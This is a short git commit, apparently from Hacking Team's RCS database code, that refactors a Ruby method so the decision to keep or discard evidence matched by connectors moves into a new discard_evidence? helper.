67c1c46dd51b41fd10e75f129adaefa678ba8d2b
topac <topac@hackingteam.com>
2013-06-25 10:53:35 +0200

    #discard_evidence? method

--- lib/rcs-db/connectors.rb
+++ lib/rcs-db/connectors.rb
@@ -9,15 +9,18 @@ module RCS
 
       # If the evidence match some connectors, adds that evidence and that
       # collectors to the CollectorQueue.
-      # @retuns :keep if evidence match at least one connector with keep = true,
-      # otherwise :discard.
       def self.add_to_queue(target, evidence)
         matched_connectors = ::Connector.matching(evidence)
         return if matched_connectors.blank?
 
         ConnectorQueue.add(target, evidence, matched_connectors)
-        discard_evidence = matched_connectors.inject(0) { |n, conn| n += (conn.keep) ? 1 : 0 } == 0
-        discard_evidence ? :discard : :keep
+        discard_evidence?(matched_connectors) ? :discard : :keep
+      end
+
+      # if evidence match at least one connector with keep = true, returns
+      # false (do not discard), otherwise true (discard).
+      def self.discard_evidence? connectors
+        connectors.inject(0) { |n, conn| n += (conn.keep) ? 1 : 0 } == 0
       end
     end
   end
